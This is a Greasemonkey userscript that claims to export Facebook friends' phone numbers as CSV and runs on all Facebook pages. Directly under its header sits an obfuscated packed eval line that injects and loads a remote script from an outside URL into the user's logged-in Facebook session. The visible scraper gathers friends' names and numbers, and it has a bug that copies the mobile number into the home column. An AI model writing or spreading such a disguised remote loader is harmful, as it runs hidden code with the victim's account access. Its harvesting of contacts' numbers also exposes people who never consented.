// ==UserScript==
// @name           Facebook phonebook export Plus + Last Update
// @namespace      shoecream@luelinks.net
// @description    Exports facebook contacts
// @include        https://www.facebook.com/friends/edit/?sk=phonebook
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @license        cc-by-sa
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//
// with fixes by Vikas Dhiman

function find_children (dom, callback) {
    // depth-first search of a DOM node's children. expects a callback that
    // takes one argument, a DOM node. returns an Array of DOM nodes for which
    // the callback returned true
    if (typeof callback != 'function') throw new TypeError();
    var stack = [];
    var children = dom.childNodes;
    for (var i = 0; i < children.length; i++) {
        if (callback(children[i]))
            stack.push(children[i]);
        if (children[i].hasChildNodes()) {
            var newstack = find_children(children[i], callback);
            if (newstack.length) {
                for (var j = 0; j < newstack.length; j++) {
                    stack.push(newstack[j]);
                }
            }
        }
    }
    return stack;
}


function search () {
    // main function
    var getNum = function (dom) {
        if (dom.className == "fsl")
            return true;
    };

    var getId = function(dom) {
        // gets the friend ID of an associated profile link.
        // assumes that every profile link on this page uses a friend ID
        // and not a vanity username.
        var titles = dom.getElementsByTagName('a');
        for (var i = 0; i < titles.length; i++) {
            if (/\/profile.php\?id=\d+/i.test(titles[i].href)) {
                return titles[i].href;
            }
        }
    }


    var stripNum = function (no) {
        return no.replace(/[^\d]/g, '');
    }

    var dictionary = {};
    var rows = document.getElementsByClassName('phonebookEntry');
    for (var i = 0; i < rows.length; i++) {
        var profile_link = rows[i].getElementsByClassName('fwb')[0];
        var unique_id = getId(profile_link);
        if (!unique_id) { 
            unique_id = profile_link.textContent; //hopefully unique...
        }
        var fixed_name = profile_link.textContent.replace(/^\s+|\s+$/g, '').replace(/\s{2,}/, ' ');
        dictionary[unique_id] = {name: fixed_name};
        var numbers = find_children(rows[i], getNum);
        if (numbers.length >= 1) {
            dictionary[unique_id].mobile = stripNum(numbers[0].textContent);
            if (numbers.length >= 2) {
                dictionary[unique_id].land = stripNum(numbers[0].textContent);
            }
        }
    }
    alert(serialize(dictionary));
}

function serialize(obj) {
    var rows = ['Name,Mobile Phone,Home Phone'];
    for (var i in obj) {
        var cols = [];
        if (obj.hasOwnProperty(i) && obj[i]) {
            if (obj[i].mobile || obj[i].land) {
                cols.push(obj[i].name);
                cols.push(obj[i].mobile ? obj[i].mobile : '' );
                cols.push(obj[i].land   ? obj[i].land   : '' );
                rows.push(cols.join(','));
            }
        }
    }
    return rows.join('\n');
}

GM_registerMenuCommand('Grab Phone Numbers', search);
